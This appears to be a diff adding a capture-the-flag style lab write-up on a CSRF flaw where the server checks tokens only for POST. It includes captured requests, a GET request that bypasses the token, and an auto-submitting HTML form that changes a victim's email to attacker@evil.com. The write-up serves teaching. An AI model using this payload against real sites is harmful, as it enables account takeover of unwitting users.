@@ -1,0 +1,79 @@
+🔹 Lab Write-up: CSRF where token validation depends on request method
+1. Understanding the Functionality
+
+Logged in as wiener:peter.
+
+Navigated to Change Email form in the account settings.
+
+Submitted the form and intercepted the request in Burp.
+
+Captured request (POST):
+
+POST /my-account/change-email HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=ObL4BqYBvXWLr0bukRbk6khaW8zT0aWr
+Content-Type: application/x-www-form-urlencoded
+
+email=test@exploit.com&csrf=4M8kHq4V0P2Qd...
+
+
+Observation:
+
+The request contains a CSRF token (csrf).
+
+When modifying this token, the server rejects the request → token is validated for POST requests.
+
+2. Testing Request Method Behavior
+
+Sent the same request to Repeater.
+
+Used Burp → Change request method → GET.
+
+Modified request (GET):
+
+GET /my-account/change-email?email=test@exploit.com&csrf=INVALID HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=ObL4BqYBvXWLr0bukRbk6khaW8zT0aWr
+
+
+Result:
+✅ Email successfully updated — server ignores CSRF token when method = GET.
+
+3. Crafting the Exploit PoC
+
+Now that we know GET bypasses CSRF token validation, we can build a malicious HTML page that automatically makes the victim’s browser send this GET request:
+
+<html>
+  <body>
+    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+4. Exploitation
+
+Go to the exploit server.
+
+Paste the above HTML in the Body section.
+
+Store the exploit.
+
+First test with your own account (View exploit) → confirm the email is updated.
+
+Modify email to a different value (attacker@evil.com).
+
+Deliver exploit to victim → ✅ Lab solved.
+
+5. Conditions for Successful CSRF
+
+Action performed: Change email request.
+
+Authentication: Session cookie (session=...) automatically included by victim’s browser.
+
+Predictable parameters: Only email is required, no unpredictable tokens enforced when using GET.
+
+✅ Root Cause: The application validates CSRF tokens only for POST requests, but not for GET. This allows attackers to craft a GET-based CSRF exploit.
